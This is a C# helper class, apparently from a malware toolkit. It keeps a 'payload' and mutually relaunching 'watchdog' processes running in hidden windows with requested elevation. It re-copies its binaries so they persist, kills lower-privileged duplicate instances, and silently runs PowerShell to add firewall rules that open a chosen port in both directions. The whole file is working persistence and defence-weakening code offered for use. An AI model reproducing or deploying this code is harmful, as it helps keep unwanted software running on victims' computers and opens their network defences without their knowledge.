using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;


    public class watchdogHelper
    {

        private static bool IsMutexRunning(string mutexName)
        {
            bool isNewInstance;
        try
        {
            // Attempt to create a mutex with the specified name
            using (Mutex mutex = new Mutex(false, "Global\\" + mutexName, out isNewInstance))
            {
                // If a new instance was created, it means no other instance was running
                if (isNewInstance)
                {
                    // Release the mutex so it's not held by this check
                    return false;
                }
                else
                {
                    // If we couldn't create a new instance, another instance is already running
                    return true;
                }
            }
        }
        catch (Exception ex) {
            Log($"Error verifying if mutex is running: {ex.Message}");
            return false;
        }
        }

        private static bool IsProcessRunning(string processName)
        {
            // Get a list of processes by name
            processName = processName.Replace(".exe", "");

            Process[] processes = Process.GetProcessesByName(processName); //does processes by name when mutex cant be used (for the payload)
            return processes.Length > 0;
        }

        public static void Log(string message)
        {
            if (Config.Debugging)
            { //logs when specified by user in Config
                Console.WriteLine(message);
            }
        }

        public static void verifyFilePathsSourceAndDest(string destinationPath, string filename) //checks for if file exists then copies it if not
        {
            try
            {
            string currentDirectory = Directory.GetCurrentDirectory();
            string sourcePathFile = Path.Combine(currentDirectory, filename);
            string destPathFile = Path.Combine(destinationPath, filename);


            EnsureDirectoryExists(destinationPath);


            if (File.Exists(destPathFile) && File.Exists(sourcePathFile))
            {
                return;
            }
            else
            {

                if (File.Exists(sourcePathFile))
                {
                    // Copy the .exe to the destination
                    try
                    {
                        File.Copy(sourcePathFile, destPathFile, overwrite: false);
                        Log($"'{filename}' found and copied to {destPathFile}");
                    }
                    catch (Exception ex)
                    {
                        Log($"Error copying file: {ex.Message}");
                    }
                }
                else if (File.Exists(destPathFile))
                {
                    try
                    {
                        File.Copy(destPathFile, sourcePathFile, overwrite: false);
                        Log($"'{filename}' found and copied to {sourcePathFile}");
                    }
                    catch (Exception ex)
                    {
                        Log($"Error copying file: {ex.Message}");
                    }
                }
                else
                {
                    Log($"'{filename}' not found in the current directory.");
                }
            }
        }
        catch (Exception ex) {
            Log($"Error verifying and copying filepaths: {ex.Message}");
        }
        }

        public static void EnsureHighestPriv(bool isNewInstance)
        {
        bool isAdmin = watchdogHelper.IsRunningAsAdministrator();

        if (!isNewInstance && isAdmin)
        {

            watchdogHelper.Log("Another instance of the watchdog is already running.");

            int? PID = watchdogHelper.GetProcessIdByName(Process.GetCurrentProcess().ProcessName);

            if (PID.HasValue)
            {
                string permissionLevel = watchdogHelper.GetProcessPermissionLevel((int)PID);
                // rest of your code here

                if (permissionLevel != "Administrator")
                {
                    watchdogHelper.Log("Killing lower privledged process.");
                    watchdogHelper.KillProcessById((int)PID);
                }
                else
                {
                    Environment.Exit(0);
                }
            }
            else
            {
                // handle the case when PID is null
                watchdogHelper.Log("Failed to get process ID.");
                Environment.Exit(0);
            }
        }
        else if (!isNewInstance)
        {
            Environment.Exit(0);
        }

        // Call the main watchdog logic
        if (isNewInstance)
        {
            return;
        }
        else
        {
            Environment.Exit(0);
        }
        }

        private static void runBinary(string filePath, string arguments = "")
        {
        try
        {
            // Create a new ProcessStartInfo for the executable
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = filePath,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
                Verb = "runas" // Request elevated privileges
            };

            // Create a new instance of Process each time
            using (Process process = new Process())
            {
                process.StartInfo = startInfo;
                process.Start();

                // Optionally, handle output asynchronously if needed
                process.OutputDataReceived += (sender, e) =>
                {
                    if (e.Data != null)
                    {
                        // Handle output data here
                        Log($"Log from running binary: {e.Data}");
                    }
                };
                process.BeginOutputReadLine();

                // Note: No WaitForExit(), allowing the process to run without blocking
            }
        }
        catch (Exception ex) { 
        Log($"Error Running Binary: {ex.Message}");
        }
        }
    public static bool KillProcessById(int pid)
    {
        try
        {
            Process process = Process.GetProcessById(pid);
            process.Kill();
            process.WaitForExit(); // Optionally wait for the process to exit
            return true;
        }
        catch (ArgumentException)
        {
            watchdogHelper.Log("No process with the specified PID is running.");
        }
        catch (Exception ex)
        {
            watchdogHelper.Log($"Failed to kill process: {ex.Message}");
        }
        return false;
    }

    public static bool IsRunningAsAdministrator()
    {
        WindowsIdentity identity = WindowsIdentity.GetCurrent();
        WindowsPrincipal principal = new WindowsPrincipal(identity);
        return principal.IsInRole(WindowsBuiltInRole.Administrator);
    }

    public static string GetProcessPermissionLevel(int pid)
    {
        try
        {
            using (Process process = Process.GetProcessById(pid))
            {
                IntPtr processHandle = process.Handle;

                if (IsProcessElevated(processHandle))
                    return "Administrator";
                else
                    return "User";
            }
        }
        catch (Exception ex)
        {
            watchdogHelper.Log($"Error getting process permission level: {ex.Message}");
            return "Unknown";
        }
    }

    private static bool IsProcessElevated(IntPtr processHandle)
    {
        IntPtr tokenHandle = IntPtr.Zero;
        try
        {
            if (OpenProcessToken(processHandle, TOKEN_QUERY, out tokenHandle))
            {
                var elevation = new TOKEN_ELEVATION();
                int elevationSize = Marshal.SizeOf(typeof(TOKEN_ELEVATION));
                IntPtr elevationPtr = Marshal.AllocHGlobal(elevationSize);

                try
                {
                    if (GetTokenInformation(tokenHandle, TOKEN_INFORMATION_CLASS.TokenElevation, elevationPtr, elevationSize, out _))
                    {
                        elevation = (TOKEN_ELEVATION)Marshal.PtrToStructure(elevationPtr, typeof(TOKEN_ELEVATION))!;
                        return elevation.TokenIsElevated != 0;
                    }
                }
                finally
                {
                    Marshal.FreeHGlobal(elevationPtr);
                }
            }
            return false;
        }
        finally
        {
            if (tokenHandle != IntPtr.Zero)
            {
                CloseHandle(tokenHandle);
            }
        }
    }

    // WinAPI functions and constants
    private const int TOKEN_QUERY = 0x0008;

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool OpenProcessToken(IntPtr processHandle, int desiredAccess, out IntPtr tokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool GetTokenInformation(IntPtr tokenHandle, TOKEN_INFORMATION_CLASS tokenInfoClass, IntPtr tokenInfo, int tokenInfoLength, out int returnLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);

    private enum TOKEN_INFORMATION_CLASS
    {
        TokenElevation = 20
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct TOKEN_ELEVATION
    {
        public int TokenIsElevated;
    }

    public static void OpenFirewallPort(int port, string ruleName)
    {
        try
        {
            string outboundRuleName = ruleName + "Outbound";

            // PowerShell command to check if the rule exists and is enabled
            string checkInboundRuleCmd = $"Get-NetFirewallRule -DisplayName '{ruleName}' -ErrorAction SilentlyContinue | Select-Object Enabled";
            string checkOutboundRuleCmd = $"Get-NetFirewallRule -DisplayName '{outboundRuleName}' -ErrorAction SilentlyContinue | Select-Object Enabled";

            // PowerShell commands to add the rule if it doesn't exist
            string addInboundRuleCmd = $"New-NetFirewallRule -DisplayName '{ruleName}' -Direction Inbound -Protocol TCP -LocalPort {port} -Action Allow";
            string addOutboundRuleCmd = $"New-NetFirewallRule -DisplayName '{outboundRuleName}' -Direction Outbound -Protocol TCP -LocalPort {port} -Action Allow";

            // PowerShell commands to enable the rule if it exists but is disabled
            string enableInboundRuleCmd = $"Set-NetFirewallRule -DisplayName '{ruleName}' -Enabled True";
            string enableOutboundRuleCmd = $"Set-NetFirewallRule -DisplayName '{outboundRuleName}' -Enabled True";

            // Check the inbound rule
            bool inboundRuleExists = ExecutePowerShellCommand(checkInboundRuleCmd);
            if (inboundRuleExists)
            {
                bool inboundRuleEnabled = CheckRuleEnabledStatus(checkInboundRuleCmd);
                if (!inboundRuleEnabled)
                {
                    ExecutePowerShellCommand(enableInboundRuleCmd);
                }
            }
            else
            {
                ExecutePowerShellCommand(addInboundRuleCmd);
            }

            // Check the outbound rule
            bool outboundRuleExists = ExecutePowerShellCommand(checkOutboundRuleCmd);
            if (outboundRuleExists)
            {
                bool outboundRuleEnabled = CheckRuleEnabledStatus(checkOutboundRuleCmd);
                if (!outboundRuleEnabled)
                {
                    ExecutePowerShellCommand(enableOutboundRuleCmd);
                }
            }
            else
            {
                ExecutePowerShellCommand(addOutboundRuleCmd);
            }
        }
        catch (Exception ex)
        {
            watchdogHelper.Log($"Error Modifying firewall with powershell: {ex.Message}");
        }
    }

    // Helper method to check if a rule is enabled
    private static bool CheckRuleEnabledStatus(string checkRuleCmd)
    {
        string? result = ExecutePowerShellCommandWithOutput(checkRuleCmd);
        
        if(result == null)
        {
            return true;
        }
        return result.Contains("True");
    }

    private static bool ExecutePowerShellCommand(string command)
    {
        try
        {
            using (Process process = new Process())
            {
                process.StartInfo.FileName = "powershell.exe";
                process.StartInfo.Arguments = $"-Command \"{command}\"";
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;

                process.Start();
                process.WaitForExit();

                if (process.ExitCode != 0)
                {
                    watchdogHelper.Log($"Error in output of powershell command:[{command} {process.StandardError.ReadToEnd() }");
                    return false;
                }

                return true;
            }
        }
        catch (Exception ex)
        {
            watchdogHelper.Log("Error Running powershell command: " + ex.Message);
            return false;
        }
    }

    private static string? ExecutePowerShellCommandWithOutput(string command)
    {
        try { 
        using (Process process = new Process())
        {
            process.StartInfo.FileName = "powershell.exe";
            process.StartInfo.Arguments = $"-Command \"{command}\"";
            process.StartInfo.UseShellExecute = false;
                if (Config.Debugging)
                {
                process.StartInfo.CreateNoWindow = false;
                process.StartInfo.RedirectStandardError = false;
                process.StartInfo.RedirectStandardOutput = false;


                }
                else
                {
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.RedirectStandardError = true;
                process.StartInfo.RedirectStandardOutput = true;
                }

                process.Start();
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            if (process.ExitCode != 0)
            {
                watchdogHelper.Log($"Error: {process.StandardError.ReadToEnd()}");
                return null; // Return null if there's an error
            }

            return output;
        }
        }
        catch (Exception ex)
        {
            watchdogHelper.Log("Error: " + ex.Message);
            return "";
        }
    }


        public static int? GetProcessIdByName(string processName)
        {
        try
        {
            Process[] processes = Process.GetProcessesByName(processName);

            foreach (var process in processes)
            {
                // Skip the current process
                if (process.Id == Process.GetCurrentProcess().Id) continue;

                // Return the ID of the first instance found that's not the current process
                return process.Id;
            }
        }
        catch (Exception ex)
        {
            watchdogHelper.Log("Error getting PID from process name: " + ex.Message);
        }

        return null; // Return null if no process is found or an error occurs
    }


    public static void CheckAndRunWatchdog(string watchdogPath, string watchdogName, string mutex)
        {
            if (!IsMutexRunning(mutex)) // uses mutexes to verify whether watchdogs are running
        {
                runBinary(Path.Combine(watchdogPath, watchdogName));
            }
        }

        public static void CheckAndRunPayload(string payloadPath, string payloadName)
        {
            if (!IsProcessRunning(payloadName)) // uses the filename to verify whether payload is running
        {
                runBinary(Path.Combine(payloadPath, payloadName));
            }
        }

        public static void EnsureDirectoryExists(string dirPath)
        {
            try
            {
                if (!Directory.Exists(dirPath))
                {
                    Directory.CreateDirectory(dirPath);
                }
            }
            catch (Exception ex)
            {
                // Log or handle the exception here
                Log($"An error occurred while creating the directory: {ex.Message}");
            }
        }


    }
